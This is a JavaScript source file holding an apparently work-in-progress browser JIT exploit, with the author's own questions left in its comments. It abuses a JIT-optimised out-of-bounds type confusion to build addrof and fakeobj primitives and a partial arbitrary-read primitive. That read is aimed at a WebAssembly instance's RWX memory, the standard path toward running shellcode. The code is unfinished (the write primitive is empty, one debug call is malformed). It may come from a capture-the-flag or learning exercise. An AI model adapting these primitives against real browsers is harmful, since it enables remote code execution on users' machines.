var buf = new ArrayBuffer(8);
var u64_buf = new Uint32Array(buf);
var f64_buf = new Float64Array(buf);

function hex(val) {
	return ftoi(val).toString(16)
}

function itof(val) {
	u64_buf[0] = Number(val & 0xffffffffn);
	u64_buf[1] = Number(val >> 32n);
	return f64_buf[0];
}

function ftoi(val) {
	f64_buf[0] = val;
	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

// Prints out a double value in hex
function hex(val) {
    return "0x" + ftoi(val).toString(16)
}

// It is important to note that reading out the last element in the array will happen as though we were reading from a double array. This is because of the JIT optimizations. This means we would actually be reading a 64 bit / 8 byte value as opposed to 4 bytes. This is because when we read a value from a double array, we read 8 bytes. When we read a value from an object array, however, we only read 4 bytes
// Question: Why am I able to do this even without using idx = -1?
function read_bug(arr, idx) {
   
    ret = 0;
    for (var i = 0; i < 100; i++) {
        ret ++;
    }
    return arr[idx]

}

function write_bug(arr, idx, val) {
    
    ret = 0;
    for (var i = 0; i < 100; i++) {
        ret ++;
    }
    arr[idx] = val
    return
}

// Creates an addrof primitive
// Do this by placing object into the array
// Get the address of the object
function addrof(arr, obj) {
    arr[1] = obj
    // will look like obj[1]obj[0]
    int_addr = ftoi(read_bug(arr,0))
    //console.log("obj[1]obj[0] looks like: ", hex(itof(int_addr)))
    addr = (BigInt(int_addr) & (0xffffffffn << 32n)) >> 32n
    //addr += (addr << 32n)
    return itof(addr)
}

// Because we have essentially "trained" the JIT to do a double write, 
// we can write some memory address to this object array
// Just gonna write the object to both places in the index
// value is int
// Able to write some values but not sure why objarr[0] is not what is expected
function fakeobj(arr, idx, value) {
    to_write = BigInt(value) + (BigInt(value) << 32n)
    //console.log("fakeobj hex is: ", hex(itof(to_write)))
    float_addr = itof(to_write)
    console.log("fake obj ggives: ", hex(float_addr))
    write_bug(arr, idx, float_addr)
    return arr[0] // this is now interpreted as an object
}

function test(obj_arr) {
    // Testing addrof
    new_obj = {"c":"d"}
    addr = addrof(obj_arr, new_obj)
    console.log("Address is: ", hex(addr), addr)
}

// arb_read reads data from some address
// What am I reading? How do I read it?
// This is the address to read
// Interpreting this as a double array?
function arb_read(addr) {

    // Need the backing store of the read arr to be <size of the array><addr> <-- these values will get swapped positionally once it is placed in memory
    console.log("arb read")
    //size_backing = (0x8n << 32n) + (addr) 
    size_backing = itof(BigInt("0x800000000")+addr- 0x8n);
    read_arr[1] = size_backing
    fakeobj_addr = ftoi(addrof(read_arr)) - 0x20n
    console.log("[*] fakeobj addr is: ", hex(itof(fakeobj_addr)))
    fobj = fakeobj(obj_arr, 0, fakeobj_addr)
    console.log("ok")
    console.log(fobj)
    console.log(addrof(fobj), "hi")
    return fobj

}

// Write to the leaked address
function arb_write() {

}


function exploit() {

    // Trigger the just in time compilation
    dbl_arr = [2.1, 2.1]
    obj_arr = [{"hi":1}, {"wor":2}]
    for (var i = 0; i < 100000; i++) {
        // will this get optimized out since the value isnt' used?
        read_bug(dbl_arr, 1);
        write_bug(dbl_arr, 1, 2.3);
    }

    // This is needed for arb_read()
    fake_arr = [1.1, 1.2, 1.3, 1.4]
    new_arr = [1.1]
    temp = {1:2}
    // Getting some map pointer to be used for the exploit
    fake_arr_map_ptr = addrof(obj_arr, fake_arr) // This gives the 4 byte address of the map pointer as some double value
    //console.log("new arr pointer is: ", hex(addrof(obj_arr, temp)))
    console.log("Fake map pointer is: ", hex(obj_arr, fake_arr_map_ptr))
    //console.log("new arr pointer is: ", hex(addrof(obj_arr, new_arr)))
   
    // We will interpret the backing store of the read_arr as some object in memory
    read_arr = [fake_arr_map_ptr, 1.2, 1.3, 1.4]


    // wasm code 
    var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasm_mod = new WebAssembly.Module(wasm_code)
    var wasm_instance = new WebAssembly.Instance(wasm_mod)
    var f = wasm_instance.exports.main
    

    //rwx_addr = arb_read(ftoi(addrof(wasm_instance)) + 0x68n - 0x1n)
    wasm_addr = addrof(wasm_instance)
    console.log("[*] wasm address: ", hex(wasm_addr))
    rwx_addr = arb_read(ftoi(wasm_addr))
    //console.log("[*] rwx address: ", hex(rwx_addr))

}

exploit()
